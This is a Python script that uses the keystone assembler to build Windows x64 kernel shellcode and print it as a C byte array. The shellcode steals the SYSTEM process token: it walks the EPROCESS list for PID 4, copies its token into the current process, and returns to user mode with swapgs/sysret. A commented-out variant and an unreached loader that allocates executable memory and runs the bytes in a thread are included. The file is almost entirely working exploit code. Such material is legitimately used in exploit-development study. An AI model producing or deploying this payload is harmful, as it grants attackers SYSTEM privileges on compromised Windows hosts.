import ctypes, struct
import binascii
import os
import subprocess
from keystone import *
 
def main():
    # SHELLCODE = (
    #     "  get_eproc:"
    #     "  xor rax, rax ;" # 0 our RAX
    #     "  mov rax, gs:[rax + 0x180+0x08];" # Get the current _KTHREAD KPCR.KPRCB.CurrentThread
    #     "  mov rax, qword ptr [rax + 0x98+0x20] ;" # Get the current _EPROCESS CurrentThread.ApcState.Process == Current EPROCESS
    #     "  mov r8, rax ;" # Save the current process _EPROCESS in R8
    #     "parse_eproc:" # Loop to find system process
    #     "  mov rax, qword ptr [rax + 0x448] ; " # Get the next entry in the list, 
    #     "  sub rax, 0x448 ; " # Go to the start of the _EPROCESS
    #     "  mov rcx, qword ptr [rax + 0x440] ;" # Move UniqueProcessId to RCX
    #     "  cmp rcx, 0x4 ;" # Compare it to the SYSTEM PID
    #     "  jne parse_eproc ;" # If it’s not equal go to next entry
    #     "steal_token:"  # Found the system process
    #     "  mov r9, qword ptr [rax + 0x4b8] ; " # Copy TOKEN_REFERENCE to R9
    #     "  and r9, 0xf0 ;"
    #     "  mov qword ptr [r8 + 0x4b8], r9;" # Replace unprivileged TOKEN with System process TOKEN
    #     "restore:"
    #     "  mov rax, gs:[0x188]		;" # _KPCR.Prcb.CurrentThread
	#     "  mov cx, [rax + 0x1e4]		; " # KTHREAD.KernelApcDisable
	#     "  inc cx;"
	#     "  mov [rax + 0x1e4], cx;"
	#     "  mov rdx, [rax + 0x90] 	; " # ETHREAD.TrapFrame
	#     "  mov rcx, [rdx + 0x168]	; " # ETHREAD.TrapFrame.Rip
	#     "  mov r11, [rdx + 0x178]	; " # ETHREAD.TrapFrame.EFlags
	#     "  mov rsp, [rdx + 0x180]	; " # ETHREAD.TrapFrame.Rsp
	#     "  mov rbp, [rdx + 0x158]	; " # ETHREAD.TrapFrame.Rbp
	#     "xor eax, eax 	; " # return STATUS_SUCCESS to NtDeviceIoControlFile 
	#     "swapgs; "
    #     "sysret;"
    # )

    SHELLCODE = (
        "start:"
        "mov rax, gs:[0x180+0x8] ; " # rax == KPCR.KPRCB.CurrentThread
        "mov rax, [rax+0x98+0x20] ; " # rax == CurrentThread.ApcState.Process == Current EPROCESS
        "mov r8, rax ; " # store Current(Target) EPROCESS to r8

        "loop_for_system_process:"
        "mov r8, [r8+0x448] ; " # r8 == ActiveProcessLinks.Flink (Flink points to next _EPROCESS's ActiveProcessLinks.Flink)"
        "sub r8, 0x448 ; " # go back to start of the EPROCESS chunk"
        "mov r9, [r8+0x440] ; " # Store Current EPROCESS's PID to r9"
        "cmp r9, 0x4  ; " # Is current EPROCESS's PID 4? == Is Current EPROCESS's PID the System PID?"
        "jnz loop_for_system_process ;"
        
        "token_steal:"
        "mov rcx, [r8+0x4b8] ; " # Store System Process's Token into rcx
        "and cl, 0xf0 ; " # Clear low 4bits of Token, as last 4bits of Token is the RefCount"
        "mov [rax+0x4b8], rcx ; " # replace current process's Token into System Process's Token"
        
        "leave:"
        "mov rax, gs:[0x188]     ; " # _KPCR.Prcb.CurrentThread
        "mov cx, [rax + 0x1e4]   ; " # KTHREAD.KernelApcDisable
        "inc cx ; "
        "mov [rax + 0x1e4], cx ; "
        "mov rdx, [rax + 0x90]   ; " # ETHREAD.TrapFrame
        "mov rcx, [rdx + 0x168]  ; " # ETHREAD.TrapFrame.Rip
        "mov r11, [rdx + 0x178]  ; " # ETHREAD.TrapFrame.EFlags
        "mov rsp, [rdx + 0x180]  ; " # ETHREAD.TrapFrame.Rsp
        "mov rbp, [rdx + 0x158]  ; " # ETHREAD.TrapFrame.Rbp
        "xor eax, eax    ; " # return STATUS_SUCCESS to NtDeviceIoControlFile
        "swapgs ; "
        "sysret ; "
    )
 
    # Initialize engine in 64-Bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    instructions, count = ks.asm(SHELLCODE)
 
    sh = b""
    output = ""
    CSharpOutput = ""
    for opcode in instructions:
        sh += struct.pack("B", opcode)                          # To encode for execution
        output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
        CSharpOutput += "0x{0:02x},".format(int(opcode)).rstrip("\n") # For C# shellcode
 
 
    shellcode = bytearray(sh)

    print("BYTE token_steal[] = \"" + output + "\";")
    exit(0)

    input("Press any key to continue...");
 
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t ) 
    ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int) ) 
 
    space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buff = ( ctypes.c_char * len(shellcode) ).from_buffer_copy( shellcode )
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1);
 
if __name__ == "__main__":
    main()
